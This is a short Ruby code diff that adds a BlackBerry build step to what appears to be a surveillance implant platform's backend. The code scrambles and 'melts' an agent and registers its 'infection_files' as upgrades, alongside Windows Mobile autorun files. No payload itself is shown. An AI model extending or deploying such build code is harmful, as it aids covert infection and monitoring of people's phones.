@@ -233,7 +233,19 @@ class Item
             build.scramble
             build.melt({'admin' => false, 'demo' => self.demo})
             add_upgrade('wmcore.001', File.join(build.tmpdir, 'autorun.exe'))
-            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))
+            add_upgrade('wmcore.002', File.join(build.tmpdir, 'autorun.zoo'))                       
+            build.clean
+            
+            build = RCS::DB::Build.factory(:blackberry)
+            build.load({'_id' => factory._id})
+            build.unpack
+            build.patch({'demo' => self.demo})
+            build.scramble
+            build.melt({'appname' => 'bb_in'})
+            build.infection_files('bb_in').each do |f|
+              trace :debug, " BlackBerry adding: #{f}"
+              add_upgrade(f[:name], f[:path])
+            end
             build.clean
           end
 
